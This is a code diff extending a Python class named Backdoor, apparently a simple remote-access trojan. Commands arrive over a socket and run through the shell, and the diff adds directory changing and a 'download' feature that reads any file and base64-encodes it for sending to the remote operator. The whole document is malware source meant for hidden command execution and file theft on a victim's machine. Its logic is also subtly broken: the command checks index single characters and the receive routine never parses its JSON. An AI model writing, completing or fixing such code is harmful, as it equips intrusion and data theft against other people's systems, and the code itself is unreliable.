@@ -1,5 +1,7 @@
+import os
 import json
 import socket
+from base64 import b64encode
 import subprocess
 
 class Backdoor:
@@ -13,21 +15,42 @@ class Backdoor:
         self.connection.send(json_data)
 
     def receive(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ''
+        while True:
+            try:
+                json_data += self.connection.recv(1024)
+                return json_data
+            except ValueError:
+                continue 
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
+    
+    def change_working_dir(self, path):
+        os.chdir(path)
+        return f'[+] Changing working directory to {path}'
+    
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return  b64encode(file.read())
 
     def run(self):
         while True:
             command = self.connection.recv(1024).decode('utf-8')
             
-            if command.lower() == 'exit':
-                break
-            
-            result = self.execute_system_command(command)
-            self.send(result)
+            if command[0].lower() == 'exit':
+                self.connection.close()
+                exit()
+
+            elif command[0].lower() == 'cd' and len(command)>1:
+                command_result = self.change_working_dir(command[1])
+
+            elif command[0].lower() == 'download':
+                command_result = self.read_file(command[1])
+
+            else:
+                command_result = self.execute_system_command(command)
+            self.send(command_result)
 
         self.connection.close()
 
